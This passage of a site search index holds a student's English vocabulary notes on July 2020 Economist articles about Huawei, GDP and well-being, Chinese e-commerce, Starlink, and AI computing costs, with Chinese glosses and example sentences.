\u603b\u7ed3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/","text":"Economist 2020 July # \u76ee\u5f55 # Economist 2020 July \u76ee\u5f55 1. Finance 1.1. Trade without trust 1.2. Blessed are the rich in spirit 2. Business 2.1. E-shopping frenzy 2.2. The battle for low-Earth orbit 3. Technology 3.1. Maching, learning 1. Finance # 1.1. Trade without trust # Summary America and Britain do not trust Huawei's devices because they think those devices were subsidized and designed to aid spying. However, China is too big to break up with in business. So, America and those countries who have the same concern need to figure out a new way that they can cooperate with China with the so-called safety. Vocabulary: pioneer n. \u5148\u950b\uff1b\u62d3\u8352\u8005 vt. \u5f00\u8f9f\uff1b\u5021\u5bfc\uff1b\u63d0\u5021 vi. \u4f5c\u5148\u9a71 Eg: TikTok could be a pioneer . gear n. \u6863\u4f4d\uff1b\u9f7f\u8f6e\uff1b\u8bbe\u5907\uff1b\u88c5\u5907\uff1b\u8863\u7269 v. \u4f7f\u9002\u5408 confine vt. \u9650\u5236\uff1b\u76d1\u7981 n. \uff08\u5c24\u6307\u67d0\u4e2a\u5730\u65b9\u9650\u5236\u884c\u52a8\u81ea\u7531\u7684\uff09\u8fb9\u754c\uff1b\uff08\u5c24\u6307\u5b66\u79d1\u6216\u6d3b\u52a8\u9886\u57df\u7684\uff09\u8303\u56f4\uff1b\u7ea6\u675f\uff1b\u9650\u5236 Eg: Britain, which works closely with America on intelligence, created a \"cell\" of cyber-expert to monitor Huawei's gear in 2010 and, later, confined it to less sensitive parts of the network. regime n. \u653f\u6743\uff0c\u653f\u4f53\uff1b\u793e\u4f1a\u5236\u5ea6\uff1b\u7ba1\u7406\u4f53\u5236 Eg: Instead a new trade regime is needed that acknowledges China's nature. autonomy n. \u4eba\u8eab\u81ea\u7531\uff1b\u81ea\u6cbb\uff1b\u81ea\u6cbb\u6743 subsidiary adj. \u8f85\u52a9\u7684\uff0c\u6b21\u8981\u7684\uff1b\u9644\u5c5e\u7684\uff1b\u5b50\u516c\u53f8\u7684 n. \u5b50\u516c\u53f8\uff1b\u8f85\u52a9\u8005 \u590d\u6570\uff1asubsidiaries Eg: Chinese firms should also be required to accept open governance of their big subsidiaries in the West, including local shareholders, foreign directors and managers with real autonomy . 1.2. Blessed are the rich in spirit # Summary The richer you are, the better life you may have. The correlation between GDP per person and Gallup's measures of well-being is obvious. Vocabulary gauge n. \u539a\u5ea6, \u76f4\u5f84 \u6d4b\u91cf\u4eea\u8868 \u89c4\u683c, \u5c3a\u5ea6 vt. \u8ba1\u91cf, \u5ea6\u91cf \u4f30\u8ba1, \u5224\u65ad Eg: GROSS DOMESTIC PRODUCT (GDP), the most common gauge of national prosperity, has taken a lot of flak in recent years. leisure n. \u95f2\u6687\uff1b\u7a7a\u95f2\uff1b\u5b89\u9038 adj. \u7a7a\u95f2\u7684\uff1b\u6709\u95f2\u7684\uff1b\u4e1a\u4f59\u7684 Eg: They also note that GDP ignores other aspects of development, including personal health, leisure time and happiness. correlate vt. & vi. \u6709\u76f8\u5173\u6027 Eg: These criticisms probably exaggerate GDP's failure to capture the wealth of nations. Gallup, a pollster, has asked people in 145 countries about various aspects of well-being. Many of these correlate strongly with GDP per person. extent n. \u957f\u5ea6, \u9762\u79ef, \u8303\u56f4 \u7a0b\u5ea6, \u9650\u5ea6 Eg: Scholars disagree over the extent to which national wealth itself causes contentment. \u5bf9\u4e8e\u56fd\u5bb6\u8d22\u5bcc\u672c\u8eab\u80fd\u5728\u591a\u5927\u7a0b\u5ea6\u4e0a\u5e26\u6765\u6ee1\u8db3\u611f\uff0c\u5b66\u8005\u4eec\u610f\u89c1\u4e0d\u4e00\u3002 paradox n. \u4f3c\u975e\u800c\u662f\u7684\u8bba\u70b9\uff1b\u6096\u8bba\uff0c\u53cd\u8bba\uff1b\u81ea\u76f8\u77db\u76fe\u7684\u4eba\u6216\u4e8b Eg: Some countries' citizens have remained glum even as GDP per person has risen, a paradox noted by Richard Easterlin, an American economist. recession n. \u7ecf\u6d4e\u8870\u9000; \u4e0d\u666f\u6c14 \u540e\u9000; \u64a4\u9000; \u64a4\u56de Eg: Studies of the previous global recession in 2009 suggest that economic hardship does indeed lead to emotional woe. staple n. \u4e3b\u8981\u4ea7\u54c1\uff1b\u9489\u4e66\u9489\uff1b\u4e3b\u9898\uff1b\u4e3b\u98df vt. \u7528\u9489\u4e66\u9489\u9489\u4f4f\uff1b\u628a\u2026\u2026\u5206\u7ea7 adj.\u4e3b\u8981\u7684\uff0c\u5927\u5b97\u751f\u4ea7\u7684\uff1b\u5e38\u7528\u7684\uff1b\u7eba\u7ec7\u7ea4\u7ef4\u7684 Eg: Adam Mayer of Colorado State University found that among Europeans of similar wealth and education, those who had recently become unemployed and struggled to buy staple foods (\u4e3b\u98df) had the worst outlook on life. probe n. \u63a2\u9488\uff1b\u8c03\u67e5 vi. \u8c03\u67e5\uff1b\u63a2\u6d4b vt. \u63a2\u67e5\uff1b\u7528\u63a2\u9488\u63a2\u6d4b Eg: Covid-19 will allow economists to probe this pattern further. toll vt. \u5f81\u6536\uff1b\u6572\u949f n. \u901a\u884c\u8d39\uff1b\u4ee3\u4ef7\uff1b\u949f\u58f0 vi. \u9e23\u949f\uff1b\u5f81\u7a0e The virus's human toll is therefore vast in terms of deaths and dollars. \u56e0\u6b64\uff0c\u5c31\u6b7b\u4ea1\u4eba\u6570\u548c\u7ecf\u6d4e\u635f\u5931\u800c\u8a00\uff0c\u8be5\u75c5\u6bd2\u9020\u6210\u7684\u4eba\u5458\u635f\u5931\u662f\u5de8\u5927\u7684\u3002 endure vt. \u5fcd\u8010\uff1b\u5bb9\u5fcd vi. \u5fcd\u8010\uff1b\u6301\u7eed Eg: But given the correlation between GDP per person and Gallup's measures of well\u2014being, it may have an enduring impact on the world\u2019s quality of life too. 2. Business # 2.1. E-shopping frenzy # Summary China's E-shopping frenzy has spawned TAMP , refers to Tencent, Alibaba, Meituan, and Pinduoduo, which may take place of BAT , the former top internet companies. Vocabulary bust v. \u6253\u7834\uff1b\u70b8\u7834\uff1b\u731b\u70c8\u6253\u51fb\uff1b\u7a81\u51fb\u641c\u6355 n. \u80f8\u56f4\uff1b\u534a\u8eab\u50cf\uff1b\u7ecf\u6d4e\u8427\u6761\uff1b\u902e\u6355\uff1b\u6ca1\u4ef7\u503c\u7684\u4e8b\u7269 adj. \u574f\u7684\uff1b\u7834\u4ea7\u7684 Eg: Yet in the eyes of many it remains \"BAT or bust \", to cite a saying among jobseekers from the country's elite universities. fusion n. \u878d\u5408\uff1b\u7194\u5316\uff1b\u7194\u63a5\uff1b\u878d\u5408\u7269\uff1b[\u7269] \u6838\u805a\u53d8 ascent n. \u4e0a\u5347\uff1b\u4e0a\u5761\u8def\uff1b\u767b\u9ad8 Eg: Central to the firm's ascent is the concept of social shopping, which it describes as a fusion of Costco and Disneyland. ferry n. \u6e21\u8239\uff1b\u6446\u6e21\uff1b\u6e21\u53e3 vt. \uff08\u4e58\u6e21\u8239\uff09\u6e21\u8fc7\uff1b\u7528\u6e21\u8239\u8fd0\u9001\uff1b\u7a7a\u8fd0 vi. \u6446\u6e21\uff1b\u6765\u5f80\u884c\u9a76 Eg: Similarly to eBay but not many e-commerce giants, Pinduoduo does not hold inventory or operate its own logistics network, relying on merchants to ferry products to buyers. perpetually adv. \u6c38\u6052\u5730\uff0c\u6301\u4e45\u5730 Eg: Uber, which also matches sellers (drivers) with buyers (riders), has been perpetually loss-making. therapy n. \u6cbb\u7597\uff0c\u7597\u6cd5 Eg: The pandemic appears to have done it no harm; cooped-up Chinese consumers have turned to the firm for necessities and, sometimes, a dose of retail therapy . negligible adj. \u5fae\u4e0d\u8db3\u9053\u7684\uff0c\u53ef\u4ee5\u5ffd\u7565\u7684 Eg: With negligible business outside China, it is, like Meituan, shielded from the Sino-American tech war making life difficult for TikTok, with it mostly non-Chinese users, or Huawei, China's telecoms champion. expel vt. \u9a71\u9010\uff1b\u5f00\u9664 exchanges n. \u4ea4\u6613\u6240\uff0c \u7968\u636e\u4ea4\u6362\u603b\u989d\uff1b\u5e02\u573a\uff0c\u5916\u5e01\u5151\u6362\uff08exchange \u590d\u6570\u5f62\u5f0f\uff09 Eg: White House threats to expel Chinese firms from American exchanges have not dampened investors' enthusiasm. embody vt. \u4f53\u73b0\uff0c\u4f7f\u5177\u4f53\u5316\uff1b\u5177\u4f53\u8868\u8fbe Eg: Ultimately, both firms embody the excitement over digital China's bright prospect. 2.2. The battle for low-Earth orbit # Summary If Starlink plan finally succeed, it may share a market worth from $50bn to $120bn or more. Vocabulary spectacle n. \u666f\u8c61\uff1b\u573a\u9762\uff1b\u5947\u89c2\uff1b\u58ee\u89c2\uff1b\u76db\u5927\u7684\u6f14\u51fa\uff1b\uff08\u590d\uff09\u773c\u955c Eg: In the past few years a new spectacle has appeared, in the form of the Satrlink satellites. resemble vt. \u7c7b\u4f3c\uff0c\u50cf Eg: Launched in batches by SpaceX, an American rocketry firm founded by Elon Musk, the tech billionaire behind Tesla's electric cars, they resemble nothing else in the heavens, floating like a train of white dots in tight formation. stagnant adj. \u505c\u6ede\u7684\uff1b\u4e0d\u666f\u6c14\u7684\uff1b\u6c61\u6d4a\u7684\uff1b\u8fdf\u949d\u7684 Eg: The market for launches is small and stagnant . beam n. \u6a2a\u6881\uff1b\u5149\u7ebf\uff1b\u7535\u6ce2\uff1b\u8239\u5bbd\uff1b[\u8ba1\u91cf] \u79e4\u6746 vt. \u53d1\u9001\uff1b\u4ee5\u6881\u652f\u6491\uff1b\u7528\u2026\u7167\u5c04\uff1b\u6d41\u9732 vi. \u7167\u5c04\uff1b\u5806\u6ee1\u7b11\u5bb9 Eg: Those satellites visible from Schumpeter's garden are the vanguard (\u5148\u950b) of a planned constellation (\u661f\u5ea7) of over 1,000, designed to beam the internet to every corner of the globe. village n. \u6751\u5e84\uff1b\u6751\u6c11\uff1b\uff08\u52a8\u7269\u7684\uff09\u7fa4\u843d rural adj. \u519c\u6751\u7684\uff0c\u4e61\u4e0b\u7684\uff1b\u7530\u56ed\u7684\uff0c\u6709\u4e61\u6751\u98ce\u5473\u7684 Eg: It could serve poorly connected villages in rural Africa (or rural America for that matter), as well as oil rigs or cargo ships at sea. descendant n. \u540e\u88d4\uff0c\u5b50\u5b59\uff1b\uff08\u7531\u8fc7\u53bb\u7c7b\u4f3c\u7269\u53d1\u5c55\u6765\u7684\uff09\u6d3e\u751f\u7269\uff1b\uff08\u673a\u5668\u7b49\uff09\u540e\u7ee7\u578b\u4ea7\u54c1 adj. \u4e0b\u964d\u7684\uff1b\u7956\u4f20\u7684 The first call on its network was between Al Gore, then America's vice-president, and a distant descendant of Alexander Graham Bell. swamp n. \u6cbc\u6cfd\uff0c\u4f4e\u5730\uff0c\u6c34\u6d3c\uff1b\u6e7f\u5730\uff1b\uff08\u7528\u4e8e\u5f3a\u8c03\uff09\u67d0\u5730\u7684\u6d78\u6c34\u7a0b\u5ea6\uff1b\u8fdb\u9000\u4e24\u96be\u7684\u56f0\u5883 v. \u4f7f\u4e0d\u582a\u627f\u53d7\uff0c\u4f7f\u75b2\u4e8e\u5e94\u5bf9\uff0c\u4f7f\u5e94\u63a5\u4e0d\u6687\uff1b\u6df9\uff0c\u6df9\u6ca1\uff1b\uff08\u8239\uff09\u88ab\u6c34\u541e\u6ca1\uff0c\u6c89\u6ca1\uff1b\u4f7f\u9677\u5165\u56f0\u5883 Eg: Nine months later the firm went bust, swamped by th upfront capital costs of launching satellites. sophisticated adj. \u590d\u6742\u7684\uff1b\u7cbe\u81f4\u7684\uff1b\u4e45\u7ecf\u4e16\u6545\u7684\uff1b\u5bcc\u6709\u7ecf\u9a8c\u7684 v. \u4f7f\u53d8\u5f97\u4e16\u6545\uff1b\u4f7f\u8ff7\u60d1\uff1b\u7be1\u6539\uff08sophisticate\u7684\u8fc7\u53bb\u5206\u8bcd\u5f62\u5f0f\uff09 Britain has long tried to nurture its small but sophisticated space sector and OneWeb is notionally a British firm. dubious adj. \u53ef\u7591\u7684\uff1b\u66a7\u6627\u7684\uff1b\u65e0\u628a\u63e1\u7684\uff1b\u534a\u4fe1\u534a\u7591\u7684 Eg: A bombastic (\u6d6e\u5938\u7684) promise to build an al-British replacement, at a cost of \uffe15bn($6.3bn) or more, looks dubious . spur n. \u9a6c\u523a\uff1b\u97ad\u7b56\uff1b\u5c71\u5634\uff1b\uff08\u516c\u8def\u6216\u94c1\u8def\u7684\uff09\u652f\u7ebf\uff1b\u9aa8\u523a v. \u7528\u8e22\u9a6c\u523a\u9a71\u9a6c\u524d\u8fdb\uff1b\u6fc0\u52b1\uff1b\u4fc3\u8fdb\uff1b\u7d27\u8d34\u4e3b\u5e72\u526a\u77ed\uff08\u526f\u68a2\uff09 monopoly n. \u5784\u65ad\uff1b\u5784\u65ad\u8005\uff1b\u4e13\u5356\u6743 Eg: In the meantime, competition from OneWeb would spur innovation and prevent SpaceX from settling into a celestial monopoly . entrepreneur n. \u4f01\u4e1a\u5bb6\uff1b\u627f\u5305\u4eba\uff1b\u4e3b\u529e\u8005 \u5f62\u5bb9\u8bcd\uff1a entrepreneurial adj. \u4f01\u4e1a\u5bb6\u7684\uff0c\u521b\u4e1a\u8005\u7684\uff1b\u4e2d\u95f4\u5546\u7684 Eg: The politest description of its entrepreneurial record is \"spotty\" -- just ask owner of clunkers (\u7834\u8f66) such as an Austin Allegro or Morris Marina, produced after the partial nationalisation (\u56fd\u6709\u5316) in 1968 of British Leyland. keep (one) on (one's) toes (\u4f7f\uff09\u4fdd\u6301\u8b66\u60d5\uff1b\u96c6\u4e2d\u6ce8\u610f\u529b To force someone to stay active, alert, and focused on something or someone. Eg: But if OneWeb keeps Mr Musk on his toes even for a little while, their loss may turn out to be global consumers' gain. 3. Technology # 3.1. Maching, learning # Summary The cost to train an AI model is rising rapidly in recent years. KPMG reckons the market for specialized AI chips, which is more effective in training AI, worth around $10bn, and could reach $80bn by 2025. With Moore's law's failing, existing computing power may not satisfy the booming needs of AI.However, there are two solutions to solve it, Quantum computing and biology computing technologies. Vocabulary balloon vi. \u6fc0\u589e\uff1b\u81a8\u80c0\u5982\u6c14\u7403 n. \u6c14\u7403 vt. \u4f7f\u50cf\u6c14\u7403\u822c\u9f13\u8d77\uff1b\u4f7f\u6fc0\u589e adj. \u50cf\u6c14\u7403\u822c\u9f13\u8d77\u7684 Eg: A combination of ballooning complexity and competition means costs at the cutting edge are rising sharply. fold vt. \u6298\u53e0\uff1b\u5408\u62e2\uff1b\u62b1\u4f4f\uff1b\u7b3c\u7f69 n. \u6298\u75d5\uff1b\u7f8a\u680f\uff1b\u4fe1\u5f92 vi. \u5f7b\u5e95\u5931\u8d25\uff1b\u6298\u53e0\u8d77\u6765 Eg: By 2018, the computer power used to train big models had risen 300,000-fold , and was doubling every three and a half months. scarce adj. \u7f3a\u4e4f\u7684, \u7f55\u89c1\u7684 Eg: Deep and steep Computing power used in training AI systems are scarce . flush vt. & vi. \u51b2\u5237, \u6e05\u9664 \u9762\u7ea2\u8033\u8d64; (\u4f7f)\u8138\u7ea2 adj. \u9f50\u5e73\u7684, \u540c\u9ad8\u7684 (\u5c24\u6307\u94b1)\u5145\u88d5\u7684, \u5bcc\u88d5\u7684 n. \u51b2\u6d17, \u6e05\u6d17 \u8138\u7ea2; \u6fc0\u52a8; \u559c\u60a6 pinch vt. \u634f\uff1b\u52d2\u7d22\uff1b\u4f7f\u82e6\u607c\uff1b\u6390\u6389\u67d0\u7269\uff0c\u4fee\u526a n. \u532e\u4e4f\uff1b\u5c11\u91cf\uff1b\u5939\u75db vi. \u5939\u75db\uff1b\u8282\u7701 Eg: Those less flush with cash are feeling the pinch . \u90a3\u4e9b\u73b0\u91d1\u6ca1\u90a3\u4e48\u5145\u88d5\u7684\u516c\u53f8\u5c31\u611f\u5230\u8089\u75db\u4e86\u3002 chip n. \u788e\u7247 \u7f3a\u53e3 \u70b8\u9a6c\u94c3\u85af\u6761 \u96c6\u6210\u7535\u8def\u7247 vt. & vi. (\u4f7f)\u5207\u6389\u788e\u7247 Eg: The growing demand for computing power has fuelled a boom in chip design and specialized devices that can perform the calculations used in AI ef\ufb01ciently. reckon vt. \u731c\u60f3; \u4f30\u8ba1 \u3008\u975e\u6b63\u3009\u601d\u5fd6; \u8bbe\u60f3 \u8003\u8651; \u8ba4\u4e3a \u3008\u6b63\u3009\u8ba1\u7b97 Eg: Alfonso Marone at KPMG reckons the market for specialized AI chips is already worth around $10bn, and could reach $80bn by 2025. opine vt. \u4ee5\u4e3a\uff1b\u60f3 vi. \u4ee5\u4e3a\uff1b\u60f3\uff1b\u8868\u793a\u610f\u89c1 Eg: Last year Jensen Huang, Nvidia's founder, opined bluntly that \"Moore's law isn\u2019t possible any more\". exotic adj. \u7531\u5916\u56fd\u5f15\u8fdb\u7684, \u975e\u672c\u5730\u7684 \u5947\u5f02\u7684, \u9192\u76ee\u7684, \u5438\u5f15\u4eba\u7684 Eg: Other researchers are therefore looking at more exotic ideas. brute adj. \u65e0\u7406\u6027\u7684\uff1b\u6b8b\u5fcd\u7684 n. \u755c\u751f\uff1b\u6b8b\u66b4\u7684\u4eba Eg: Another idea is to take inspiration from biology, which proves that current brute\u2014force (\u66b4\u529b\u7834\u89e3) approaches are not the only way. foresee vt. \u9884\u77e5\uff1b\u9884\u89c1 \u5f62\u5bb9\u8bcd\uff1a foreseeable Eg: That means that, for the foreseeable future, AI researchers will have to squeeze every drop of performance from existing computing technologies. analogy n. \u7c7b\u4f3c, \u76f8\u4f3c \u7c7b\u63a8, \u7c7b\u63a8\u6cd5 Eg: To quantify the nascent \ufb01eld's progress, he offers an analogy with video games: \"We're past Pong,\u201d he says. intuitive adj. \u6709\u76f4\u89c9\u529b\u7684;\u51ed\u76f4\u89c9\u83b7\u77e5\u7684 counter n. \u67dc\u53f0, \u67dc\u53f0\u5f0f\u957f\u684c \u8ba1\u6570\u5668 vt. & vi. \u5bf9\u6297, \u53cd\u9a73 adv. \u53cd\u65b9\u5411\u5730, \u5bf9\u7acb\u5730 Eg: One is quantum computing, which uses the counter-intuitive (adj. \u53cd\u76f4\u89c9\u7684\uff1b\u8fdd\u53cd\u8bed\u611f\u7684) properties of quantum mechanics to provide big speed-ups for some sorts of computation. diameter n. \u76f4\u5f84 \u653e\u5927\u7387 Eg: Chips are usually made in batches, with dozens or hundreds etched onto standard silicon wafers 300mm in diameter .","title":"2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#economist-2020-july","text":"","title":"Economist 2020 July"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#_1","text":"Economist 2020 July \u76ee\u5f55 1. Finance 1.1. Trade without trust 1.2. Blessed are the rich in spirit 2. Business 2.1. E-shopping frenzy 2.2. The battle for low-Earth orbit 3. Technology 3.1. Maching, learning","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#1-finance","text":"","title":"1. Finance"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#11-trade-without-trust","text":"Summary America and Britain do not trust Huawei's devices because they think those devices were subsidized and designed to aid spying. However, China is too big to break up with in business. So, America and those countries who have the same concern need to figure out a new way that they can cooperate with China with the so-called safety. Vocabulary: pioneer n. \u5148\u950b\uff1b\u62d3\u8352\u8005 vt. \u5f00\u8f9f\uff1b\u5021\u5bfc\uff1b\u63d0\u5021 vi. \u4f5c\u5148\u9a71 Eg: TikTok could be a pioneer . gear n. \u6863\u4f4d\uff1b\u9f7f\u8f6e\uff1b\u8bbe\u5907\uff1b\u88c5\u5907\uff1b\u8863\u7269 v. \u4f7f\u9002\u5408 confine vt. \u9650\u5236\uff1b\u76d1\u7981 n. \uff08\u5c24\u6307\u67d0\u4e2a\u5730\u65b9\u9650\u5236\u884c\u52a8\u81ea\u7531\u7684\uff09\u8fb9\u754c\uff1b\uff08\u5c24\u6307\u5b66\u79d1\u6216\u6d3b\u52a8\u9886\u57df\u7684\uff09\u8303\u56f4\uff1b\u7ea6\u675f\uff1b\u9650\u5236 Eg: Britain, which works closely with America on intelligence, created a \"cell\" of cyber-expert to monitor Huawei's gear in 2010 and, later, confined it to less sensitive parts of the network. regime n. \u653f\u6743\uff0c\u653f\u4f53\uff1b\u793e\u4f1a\u5236\u5ea6\uff1b\u7ba1\u7406\u4f53\u5236 Eg: Instead a new trade regime is needed that acknowledges China's nature. autonomy n. \u4eba\u8eab\u81ea\u7531\uff1b\u81ea\u6cbb\uff1b\u81ea\u6cbb\u6743 subsidiary adj. \u8f85\u52a9\u7684\uff0c\u6b21\u8981\u7684\uff1b\u9644\u5c5e\u7684\uff1b\u5b50\u516c\u53f8\u7684 n. \u5b50\u516c\u53f8\uff1b\u8f85\u52a9\u8005 \u590d\u6570\uff1asubsidiaries Eg: Chinese firms should also be required to accept open governance of their big subsidiaries in the West, including local shareholders, foreign directors and managers with real autonomy .","title":"1.1. Trade without trust"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#12-blessed-are-the-rich-in-spirit","text":"Summary The richer you are, the better life you may have. The correlation between GDP per person and Gallup's measures of well-being is obvious. Vocabulary gauge n. \u539a\u5ea6, \u76f4\u5f84 \u6d4b\u91cf\u4eea\u8868 \u89c4\u683c, \u5c3a\u5ea6 vt. \u8ba1\u91cf, \u5ea6\u91cf \u4f30\u8ba1, \u5224\u65ad Eg: GROSS DOMESTIC PRODUCT (GDP), the most common gauge of national prosperity, has taken a lot of flak in recent years. leisure n. \u95f2\u6687\uff1b\u7a7a\u95f2\uff1b\u5b89\u9038 adj. \u7a7a\u95f2\u7684\uff1b\u6709\u95f2\u7684\uff1b\u4e1a\u4f59\u7684 Eg: They also note that GDP ignores other aspects of development, including personal health, leisure time and happiness. correlate vt. & vi. \u6709\u76f8\u5173\u6027 Eg: These criticisms probably exaggerate GDP's failure to capture the wealth of nations. Gallup, a pollster, has asked people in 145 countries about various aspects of well-being. Many of these correlate strongly with GDP per person. extent n. \u957f\u5ea6, \u9762\u79ef, \u8303\u56f4 \u7a0b\u5ea6, \u9650\u5ea6 Eg: Scholars disagree over the extent to which national wealth itself causes contentment. \u5bf9\u4e8e\u56fd\u5bb6\u8d22\u5bcc\u672c\u8eab\u80fd\u5728\u591a\u5927\u7a0b\u5ea6\u4e0a\u5e26\u6765\u6ee1\u8db3\u611f\uff0c\u5b66\u8005\u4eec\u610f\u89c1\u4e0d\u4e00\u3002 paradox n. \u4f3c\u975e\u800c\u662f\u7684\u8bba\u70b9\uff1b\u6096\u8bba\uff0c\u53cd\u8bba\uff1b\u81ea\u76f8\u77db\u76fe\u7684\u4eba\u6216\u4e8b Eg: Some countries' citizens have remained glum even as GDP per person has risen, a paradox noted by Richard Easterlin, an American economist. recession n. \u7ecf\u6d4e\u8870\u9000; \u4e0d\u666f\u6c14 \u540e\u9000; \u64a4\u9000; \u64a4\u56de Eg: Studies of the previous global recession in 2009 suggest that economic hardship does indeed lead to emotional woe. staple n. \u4e3b\u8981\u4ea7\u54c1\uff1b\u9489\u4e66\u9489\uff1b\u4e3b\u9898\uff1b\u4e3b\u98df vt. \u7528\u9489\u4e66\u9489\u9489\u4f4f\uff1b\u628a\u2026\u2026\u5206\u7ea7 adj.\u4e3b\u8981\u7684\uff0c\u5927\u5b97\u751f\u4ea7\u7684\uff1b\u5e38\u7528\u7684\uff1b\u7eba\u7ec7\u7ea4\u7ef4\u7684 Eg: Adam Mayer of Colorado State University found that among Europeans of similar wealth and education, those who had recently become unemployed and struggled to buy staple foods (\u4e3b\u98df) had the worst outlook on life. probe n. \u63a2\u9488\uff1b\u8c03\u67e5 vi. \u8c03\u67e5\uff1b\u63a2\u6d4b vt. \u63a2\u67e5\uff1b\u7528\u63a2\u9488\u63a2\u6d4b Eg: Covid-19 will allow economists to probe this pattern further. toll vt. \u5f81\u6536\uff1b\u6572\u949f n. \u901a\u884c\u8d39\uff1b\u4ee3\u4ef7\uff1b\u949f\u58f0 vi. \u9e23\u949f\uff1b\u5f81\u7a0e The virus's human toll is therefore vast in terms of deaths and dollars. \u56e0\u6b64\uff0c\u5c31\u6b7b\u4ea1\u4eba\u6570\u548c\u7ecf\u6d4e\u635f\u5931\u800c\u8a00\uff0c\u8be5\u75c5\u6bd2\u9020\u6210\u7684\u4eba\u5458\u635f\u5931\u662f\u5de8\u5927\u7684\u3002 endure vt. \u5fcd\u8010\uff1b\u5bb9\u5fcd vi. \u5fcd\u8010\uff1b\u6301\u7eed Eg: But given the correlation between GDP per person and Gallup's measures of well\u2014being, it may have an enduring impact on the world\u2019s quality of life too.","title":"1.2. Blessed are the rich in spirit"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#2-business","text":"","title":"2. Business"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#21-e-shopping-frenzy","text":"Summary China's E-shopping frenzy has spawned TAMP , refers to Tencent, Alibaba, Meituan, and Pinduoduo, which may take place of BAT , the former top internet companies. Vocabulary bust v. \u6253\u7834\uff1b\u70b8\u7834\uff1b\u731b\u70c8\u6253\u51fb\uff1b\u7a81\u51fb\u641c\u6355 n. \u80f8\u56f4\uff1b\u534a\u8eab\u50cf\uff1b\u7ecf\u6d4e\u8427\u6761\uff1b\u902e\u6355\uff1b\u6ca1\u4ef7\u503c\u7684\u4e8b\u7269 adj. \u574f\u7684\uff1b\u7834\u4ea7\u7684 Eg: Yet in the eyes of many it remains \"BAT or bust \", to cite a saying among jobseekers from the country's elite universities. fusion n. \u878d\u5408\uff1b\u7194\u5316\uff1b\u7194\u63a5\uff1b\u878d\u5408\u7269\uff1b[\u7269] \u6838\u805a\u53d8 ascent n. \u4e0a\u5347\uff1b\u4e0a\u5761\u8def\uff1b\u767b\u9ad8 Eg: Central to the firm's ascent is the concept of social shopping, which it describes as a fusion of Costco and Disneyland. ferry n. \u6e21\u8239\uff1b\u6446\u6e21\uff1b\u6e21\u53e3 vt. \uff08\u4e58\u6e21\u8239\uff09\u6e21\u8fc7\uff1b\u7528\u6e21\u8239\u8fd0\u9001\uff1b\u7a7a\u8fd0 vi. \u6446\u6e21\uff1b\u6765\u5f80\u884c\u9a76 Eg: Similarly to eBay but not many e-commerce giants, Pinduoduo does not hold inventory or operate its own logistics network, relying on merchants to ferry products to buyers. perpetually adv. \u6c38\u6052\u5730\uff0c\u6301\u4e45\u5730 Eg: Uber, which also matches sellers (drivers) with buyers (riders), has been perpetually loss-making. therapy n. \u6cbb\u7597\uff0c\u7597\u6cd5 Eg: The pandemic appears to have done it no harm; cooped-up Chinese consumers have turned to the firm for necessities and, sometimes, a dose of retail therapy . negligible adj. \u5fae\u4e0d\u8db3\u9053\u7684\uff0c\u53ef\u4ee5\u5ffd\u7565\u7684 Eg: With negligible business outside China, it is, like Meituan, shielded from the Sino-American tech war making life difficult for TikTok, with it mostly non-Chinese users, or Huawei, China's telecoms champion. expel vt. \u9a71\u9010\uff1b\u5f00\u9664 exchanges n. \u4ea4\u6613\u6240\uff0c \u7968\u636e\u4ea4\u6362\u603b\u989d\uff1b\u5e02\u573a\uff0c\u5916\u5e01\u5151\u6362\uff08exchange \u590d\u6570\u5f62\u5f0f\uff09 Eg: White House threats to expel Chinese firms from American exchanges have not dampened investors' enthusiasm. embody vt. \u4f53\u73b0\uff0c\u4f7f\u5177\u4f53\u5316\uff1b\u5177\u4f53\u8868\u8fbe Eg: Ultimately, both firms embody the excitement over digital China's bright prospect.","title":"2.1. E-shopping frenzy"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E4%BA%BA/%E5%95%86%E8%AE%BA/2020_July/#22-the-battle-for-low-earth-orbit","text":"Summary If Starlink plan finally succeed, it may share a market worth from $50bn to $120bn or more. Vocabulary spectacle n. \u666f\u8c61\uff1b\u573a\u9762\uff1b\u5947\u89c2\uff1b\u58ee\u89c2\uff1b\u76db\u5927\u7684\u6f14\u51fa\uff1b\uff08\u590d\uff09\u773c\u955c Eg: In the past few years a new spectacle has appeared, in the form of the Satrlink satellites. resemble vt. \u7c7b\u4f3c\uff0c\u50cf Eg: Launched in batches by SpaceX, an American rocketry firm founded by Elon Musk, the tech billionaire behind Tesla's electric cars, they resemble nothing else in the heavens, floating like a train of white dots in tight formation. stagnant adj. \u505c\u6ede\u7684\uff1b\u4e0d\u666f\u6c14\u7684\uff1b\u6c61\u6d4a\u7684\uff1b\u8fdf\u949d\u7684 Eg: The market for launches is small and stagnant . beam n. \u6a2a\u6881\uff1b\u5149\u7ebf\uff1b\u7535\u6ce2\uff1b\u8239\u5bbd\uff1b[\u8ba1\u91cf] \u79e4\u6746 vt. 